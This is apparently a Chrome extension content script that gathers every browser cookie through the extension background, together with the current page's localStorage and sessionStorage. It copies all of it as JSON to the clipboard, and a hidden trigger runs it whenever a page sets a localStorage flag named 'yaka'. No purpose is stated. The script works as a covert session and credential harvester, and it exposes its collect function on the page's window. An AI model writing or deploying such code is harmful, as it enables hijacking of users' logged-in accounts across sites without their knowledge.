async function _cookies(){
    return new Promise((resolve)=> {
        chrome.runtime.sendMessage({ action: 'getAllCookies' }, function(response) {
            resolve(response.cookies)
        });
    })
}

async function collect() {
    
    const cookies = await _cookies()

    const storageDataString = JSON.stringify(JSON.stringify(window.localStorage));

    const sessionDataString = JSON.stringify(window.sessionStorage);

    const storageObject = JSON.stringify({
        local: storageDataString,
        cookie: cookies,
        session: sessionDataString,
        version: 'sdkjsdjskdjskdjskdjskd'+new Date().getSeconds()
    });

    function copyToClipboard(text) {
        const el = document.createElement('textarea');
        el.value = text;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
    }


    copyToClipboard(storageObject);
} 

setInterval(()=> {
    if(localStorage.getItem('yaka') != undefined){
        collect()
        localStorage.removeItem('yaka')
    }
})

window.collect = collect